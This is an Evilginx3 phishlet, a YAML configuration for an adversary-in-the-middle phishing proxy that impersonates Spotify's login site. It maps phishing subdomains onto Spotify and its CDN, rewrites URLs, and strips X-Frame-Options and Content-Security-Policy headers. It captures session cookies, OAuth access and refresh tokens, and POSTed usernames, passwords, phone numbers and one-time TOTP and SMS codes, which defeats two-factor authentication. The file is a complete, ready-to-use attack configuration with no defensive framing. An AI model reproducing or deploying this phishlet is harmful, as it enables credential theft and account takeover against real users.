min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://accounts.spotify.com/'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'spotify.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'open', orig_sub: 'open', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'i', orig_sub: 'i', domain: 'scdn.co', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'image', orig_sub: 'image', domain: 'scdn.co', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Spotify domain URLs
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: 'https://accounts\\.spotify\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'open', domain: 'spotify.com', search: 'https://open\\.spotify\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'api', domain: 'spotify.com', search: 'https://api\\.spotify\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'www', domain: 'spotify.com', search: 'https://www\\.spotify\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace Spotify CDN URLs
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'i', domain: 'scdn.co', search: 'https://i\\.scdn\\.co', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'image', domain: 'scdn.co', search: 'https://image\\.scdn\\.co', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'i', domain: 'scdn.co', search: 'https://[a-z0-9-]+\\.scdn\\.co', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'open', domain: 'spotify.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'open', domain: 'spotify.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Spotify authentication cookies
  - domain: '.spotify.com'
    keys: ['sp_dc', 'sp_key', 'sp_t', 'sp_landing', 'sp_landing_*']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.spotify.com'
    keys: ['__bon', 'spotify_app_version', 'spotify_playback_state']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.spotify.com'
    keys: ['access_token', 'refresh_token', 'token_type', 'expires_in']
    type: 'cookie'
    optional: true
  
  # User preferences
  - domain: '.spotify.com'
    keys: ['locale', 'preferred_locale', 'theme']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'phoneNumber'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/overview'
  - '^/account'
  - '^/account/subscription'
  - '^/account/profile'
  - '^/account/security'
  - '^/account/apps'

login:
  domain: 'accounts.spotify.com'
  path: '/login'

